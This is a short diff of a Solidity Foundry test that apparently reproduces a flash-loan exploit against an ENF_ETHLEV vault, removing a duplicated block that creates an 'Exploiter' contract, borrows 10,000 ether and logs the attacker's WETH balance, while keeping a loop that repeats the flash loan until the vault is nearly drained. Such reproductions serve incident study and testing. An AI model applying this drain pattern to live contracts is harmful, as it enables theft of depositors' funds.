@@ -48,13 +48,6 @@ contract ContractTest is Test {
         while (ENF_ETHLEV.totalAssets() > 1 ether) {
             deal(address(this), 0);
 
-        exploiter = new Exploiter();
-        Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));
-
-        emit log_named_decimal_uint(
-            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-            );
-
             Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));
 
             emit log_named_decimal_uint(
